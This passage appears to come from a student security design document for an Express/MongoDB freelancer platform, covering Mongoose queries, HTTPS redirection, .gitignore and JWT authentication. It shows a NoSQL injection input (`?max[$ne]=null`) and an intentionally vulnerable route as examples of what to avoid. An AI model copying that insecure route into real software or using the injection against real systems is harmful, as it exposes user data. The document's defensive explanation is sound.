Mongoose ODM uses parameterised queries by default which supports the mitigation of NoSQL injection attacks. When explicit values are passed within structured Mongoose query objects, the ODM inserts the user defined values as data then passes the query object to the underlying MongoDB driver [[10], [11]](https://www.zotero.org/google-docs/?FwtYwb). These query objects effectively act as query templates rather than concatenating strings or the raw objects to construct the query. This ensures that user input is treated as a parameterised data variable in the database query rather than an executable database command. However, validation is still required to prevent attackers from altering structural logic by passing raw objects (such as `{"$ne": null}`) instead of expected primitive values, which could cause unintended data exposure [[10], [11], [21]](https://www.zotero.org/google-docs/?lrQ6dI).

The below code snippet exemplifies how this will be achieved in the system with regards to constructing a basic query to find all free lancer documents with hourly rates greater than R200 and less than R600 per hour on the platform using Mongoose ODM. The below request safely binds the numeric constraints into the query object: 

```javascript
FreeLancer.find().where('price').gte(200),lte(600)
```

However, if the implementation allows for users to pass objects in their requests that are then chained as query conditions without validation this introduces a vulnerability that enables the query logic to be constructed dynamically seen below:

```javascript 
    try {
        // Expecting integers/strings: ?min=200&max=600
        // Passed objects: ?max[$ne]=null
        const minPrice = req.query.min;
        const maxPrice = req.query.max;

        const freelancers = await FreeLancer.find()
            .where('price')
            .gte(minPrice)
            .lte(maxPrice);

        res.json(freelancers);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
```

This is considered insecure and something that we aim to avoid in the security implementation of the system. Importantly it underlines the synergistic nature of schema validation and query parameterisation to prevent object injection [[10], [21]](https://www.zotero.org/google-docs/?h3l6ez).

## Secure Communication Protocol (HTTPS)

The system employs HyperText Transfer Protocol Secure (HTTPS) to secure communication between the client and the server. It differs from its insecure variant HyperText Transfer Protocol (HTTP) by using the Secure Socket Layer (SSL) or Transport Layer Security (TLS) the newer version to establish a shared secret key between client and server to encrypt data transmitted. TLS is used to secure the connection and the data; this boundary ensures that all application traffic, such as API request payloads, are encrypted in transit before reaching the server [[5], [6]](https://www.zotero.org/google-docs/?BGrziv).

Despite network requests like Axios or Fetch API payloads operating in the background they remain fundamentally vulnerable to packet sniffing and man-in-the-middle attacks over untrusted public networks [[5]](https://www.zotero.org/google-docs/?HPiJCS). Implementing HTTPS prevents these attacks by validating the server's identity via cryptographic certificates and ensuring malicious actors cannot read or manipulate client request data as it travels across the network [[5], [6]](https://www.zotero.org/google-docs/?WTXoG7).

Express has been configured to enable HTTPS and reject unencrypted protocols by enforcing automatic HTTP-to-HTTPS redirection. This ensures that clients that are using insecure protocols such as HTTP will be forced to use HTTPS on subsequent requests to the server [[22]](https://www.zotero.org/google-docs/?jaTeJ0).

The below code showcases the middleware implementation that will detect the request protocol and redirect to HTTPS in the eventuality that it is using HTTP:

```javascript
app.enable('trust proxy');
app.use((req, res, next) => {
  req.secure ? next() : res.redirect('https://' + req.headers.host + req.url);
});
```

## GitHub ignore 

The use of a `.gitignore` file is not considered a security mechanism as those mentioned above, however it serves as a security consideration to prevent connection strings and environmental variables defined in the `.env` file from being committed to the source control of the system. By ensuring these credentials remain strictly local, it mitigates the risk of credential exposure and unauthorised access in the event that the system's repository or source code is ever compromised [[23], [24]](https://www.zotero.org/google-docs/?GHClVv).

Below showcases the implementation of the `.gitignore` file utilised in the Express server API: 

```
# npm
node_modules
*.log
*.gz

# Yarn
yarn-error.log
yarn.lock

# Coveralls
.nyc_output
coverage

# Benchmarking
benchmarks/graphs

# Environments and Secrets 
.env 
```

**`.env`**: Blocks the main local environment file where you store your actual connection strings and API keys. The rest of the excludes are included primary to prevent the inclusion of unnecessary logging data (`*.log`, `*.gz`) and external dependencies (`node_modules`) that will bloat the size of the repository  [[23], [24]](https://www.zotero.org/google-docs/?GHClVv).. 

## JWT Authentication 

JSON Web Token (JWT) URL-safe token used to authenticate and authorise users in APIs. JWT tokens have been used in the system to authenticate a user after successful login, the server generates a signed JWT, which the client sends with subsequent requests to access protected resources [[25], [26]](https://www.zotero.org/google-docs/?kcylfA).

JWT authentication uses a request-response flow in which the server issues a signed JWT after login. The client sends this token with subsequent API requests, and the server verifies it to grant access to protected resources, such as transaction information associated with the user's account. A JWT consists of three Base64URL-encoded parts separated by dots (.)  [[25], [26]](https://www.zotero.org/google-docs/?91I4rw).. Each part stores specific information required to authenticate and verify the token on the system.

- Header: Contains metadata about the token, including the signing algorithm and token type.
- Payload: Stores claims, such as user information and token metadata.
- Signature: Verifies that the token has not been modified and was generated by a trusted source.

```mardown 
Header.Payload.Signature
xxxxxx.yyyyyyy.zzzzzzzzz
```
### Payload 

The payload contains claims about the authenticated user, namely their id, role, email and the expiration time of the token 

```json 
{  
  "sub": 1,  // The ID of the user 
  "role": "Admin",  // The user's role 
  "email": "example@gmail.com", // The user's email
  "exp": 1720900000  // Token expiration time
}
```
## JWT Authentication flow 

The below sequence diagram is a high-level overview of the JWT authentication workflow. It illustrates both the initial authentication phase (where the token is generated) and the subsequent authenticated request phase (where the token is intercepted and validated by middleware).

```mermaid 
sequenceDiagram
    autonumber
    actor Client as Client (React UI / Axios)
    participant MW as Auth Middleware (middleware/)
    participant Ctrl as Auth Controller (controllers/)
    participant DB as Database (MongoDB)

    Note over Client, DB: Initial Authentication
    Client->>Ctrl: 1. POST /api/login
    activate Ctrl
    Ctrl->>DB: 2. Verify User Credentials
    activate DB
    DB-->>Ctrl: 3. User Found & Password hashes match
    deactivate DB
    Note over Ctrl: Server signs a unique JWT payload<br/>using server secret key
    Ctrl-->>Client: 4. Response: HTTP 200 + JWT Access Token
    deactivate Ctrl

    Note over Client, DB: Authenticated Request
    Client->>MW: 5. GET /api/dashboard (With JWT in Authorization Header)
    activate MW
    Note over MW: INTERCEPTION:<br/>Decodes & validates JWT signature
    alt Token is Invalid
        MW-->>Client: 6a. HTTP 401 Unauthorized
    else Token is Valid
        Note over MW: Appends user payload (req.user)
        MW->>Ctrl: 6b. next() -> Forward authenticated request
    end
    deactivate MW
    
    activate Ctrl
    Note over Ctrl: Processes business logic<br/>for req.user
    Ctrl-->>Client: 7. Response: HTTP 200 + Dashboard Data
    deactivate Ctrl
```
---

# References 

[[1] D. A. Turner, ‘Understanding React’s Built-In HTML Escaping | ReactJS From Zero To Hero Free Online Book’, React Zero to Hero. Accessed: Sep. 07, 2026. [Online]. Available: https://reactz2h.com/chapter_12_frontend_security_for_react/series_01_xss_and_injection_defense/understanding_react_escaping](https://www.zotero.org/google-docs/?HPw47s) 

[[2] React, ‘useFormContext’, React Hook Form. Accessed: Sep. 07, 2026. [Online]. Available: https://react-hook-form.com/docs/useformcontext](https://www.zotero.org/google-docs/?HPw47s) 

[[3] Zod, ‘Defining schemas’, Defining schemas. Accessed: Sep. 07, 2026. [Online]. Available: https://zod.dev/api](https://www.zotero.org/google-docs/?HPw47s) 

[[4] Axios, ‘Intercepting http requests in Axios’, DEV Community. Accessed: Sep. 07, 2026. [Online]. Available: https://dev.to/kennymark/interceptors-in-axios-305i](https://www.zotero.org/google-docs/?HPw47s) 

[[5] Express.js, ‘Production Best Practices: Security · Express.js’, Express.js. Accessed: Sep. 07, 2026. [Online]. Available: https://expressjs.com/en/advanced/best-practice-security/](https://www.zotero.org/google-docs/?HPw47s) 

[[6] GeeksforGeeks, ‘HyperText Transfer Protocol Secure - HTTPS’, GeeksforGeeks. Accessed: Sep. 07, 2026. [Online]. Available: https://www.geeksforgeeks.org/html/explain-working-of-https/](https://www.zotero.org/google-docs/?HPw47s) 

[[7] Express.js, ‘cors middleware · Express.js’, Express.js. Accessed: Sep. 07, 2026. [Online]. Available: https://expressjs.com/en/resources/middleware/cors/](https://www.zotero.org/google-docs/?HPw47s) 

[[8] Helmet.js, ‘Helmet.js’, helmet.js. Accessed: Sep. 07, 2026. [Online]. Available: http://helmetjs.github.io/](https://www.zotero.org/google-docs/?HPw47s) 

[[9] GeeksforGeeks, ‘How to implement validation in Express JS?’, GeeksforGeeks. Accessed: Sep. 07, 2026. [Online]. Available: https://www.geeksforgeeks.org/node-js/how-to-implement-validation-in-express-js/](https://www.zotero.org/google-docs/?HPw47s) 

[[10] SlingAcademy, ‘How to prevent injection attacks in Mongoose - Sling Academy’. Accessed: Sep. 07, 2026. [Online]. Available: https://www.slingacademy.com/article/how-to-prevent-injection-attacks-in-mongoose/](https://www.zotero.org/google-docs/?HPw47s) 

[[11] ‘Mongoose ODM’, Queries. Accessed: Sep. 07, 2026. [Online]. Available: https://mongoosejs.com/docs/2.8.x/docs/query.html](https://www.zotero.org/google-docs/?HPw47s) 

[[12] D. A. Turner, ‘What Is XSS and Why React Prevents It | ReactJS From Zero To Hero Free Online Book’, React Zero to Hero. Accessed: Sep. 07, 2026. [Online]. Available: https://reactz2h.com/chapter_12_frontend_security_for_react/series_01_xss_and_injection_defense/what_is_xss_why_react_prevents](https://www.zotero.org/google-docs/?HPw47s) 

[[13] TutorialPoint, ‘RegEx in ReactJS’, RegEx in ReactJS. Accessed: Sep. 07, 2026. [Online]. Available: https://www.tutorialspoint.com/article/regex-in-reactjs](https://www.zotero.org/google-docs/?HPw47s) 

[[14] D. A. Turner, ‘Input Validation vs. Output Escaping in React | ReactJS From Zero To Hero Free Online Book’, React Zero to Hero. Accessed: Sep. 07, 2026. [Online]. Available: https://reactz2h.com/chapter_12_frontend_security_for_react/series_01_xss_and_injection_defense/input_validation_vs_escaping](https://www.zotero.org/google-docs/?HPw47s) 

[[15] D. A. Turner, ‘The Dangers of dangerouslySetInnerHTML in React | ReactJS From Zero To Hero Free Online Book’, React Zero to Hero. Accessed: Sep. 07, 2026. [Online]. Available: https://reactz2h.com/chapter_12_frontend_security_for_react/series_01_xss_and_injection_defense/dangers_of_dangerously_set_inner_html](https://www.zotero.org/google-docs/?HPw47s) 

[[16] D. A. Turner, ‘Content Security Policy for React Applications | ReactJS From Zero To Hero Free Online Book’, React Zero to Hero. Accessed: Sep. 07, 2026. [Online]. Available: https://reactz2h.com/chapter_12_frontend_security_for_react/series_01_xss_and_injection_defense/content_security_policy_react](https://www.zotero.org/google-docs/?HPw47s) 

[[17] ‘Express HTTP Headers | Compile N Run’, Express HTTP Headers. Accessed: Sep. 07, 2026. [Online]. Available: https://www.compilenrun.com/docs/framework/express/express-security/express-http-headers/](https://www.zotero.org/google-docs/?HPw47s) 

[[18] MDN, ‘Cross-Origin-Opener-Policy (COOP) header - HTTP | MDN’, MDN Web Docs. Accessed: Sep. 07, 2026. [Online]. Available: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Opener-Policy](https://www.zotero.org/google-docs/?HPw47s) 

[[19] Express.js, ‘Error Handling · Express.js’, Express.js. Accessed: Sep. 07, 2026. [Online]. Available: https://expressjs.com/en/5x/guide/error-handling/](https://www.zotero.org/google-docs/?HPw47s) 

[[20] Roman, ‘Rate limiting overall example’, GitHub. Accessed: Sep. 07, 2026. [Online]. Available: https://github.com/animir/node-rate-limiter-flexible/wiki/Overall-example](https://www.zotero.org/google-docs/?HPw47s) 

[[21] R. Santos, ‘NoSQL Injection: Breaking MongoDB From the Inside’, Kayssel’s Newsletter. Accessed: Sep. 07, 2026. [Online]. Available: https://kayssel.substack.com/p/nosql-injection-breaking-mongodb](https://www.zotero.org/google-docs/?HPw47s) 

[[22] DevGEx, ‘Automatic HTTP to HTTPS Redirection in Node.js and Express - DevGex’, Automatic HTTP to HTTPS Redirection in Node.js and Express. Accessed: Sep. 07, 2026. [Online]. Available: https://devgex.com/en/article/00024109](https://www.zotero.org/google-docs/?HPw47s) 

[[23] Express.js, ‘express/.gitignore at master · expressjs/express’, Express .gitignore. Accessed: Sep. 07, 2026. [Online]. Available: https://github.com/expressjs/express/blob/master/.gitignore](https://www.zotero.org/google-docs/?HPw47s) 

[[24] Git, ‘Git - gitignore Documentation’, gitignore. Accessed: Sep. 07, 2026. [Online]. Available: https://git-scm.com/docs/gitignore](https://www.zotero.org/google-docs/?HPw47s) 

[[25] Auth0, ‘JSON Web Tokens’, Auth0 Docs. Accessed: Sep. 07, 2026. [Online]. Available: https://auth0.com/docs/secure/tokens/json-web-tokens](https://www.zotero.org/google-docs/?HPw47s) 

[[26] GeeksforGeeks, ‘Understanding JWT Authentication in APIs’, GeeksforGeeks. Accessed: Sep. 07, 2026. [Online]. Available: https://www.geeksforgeeks.org/web-tech/understanding-jwt-authentication-in-apis/](https://www.zotero.org/google-docs/?HPw47s)
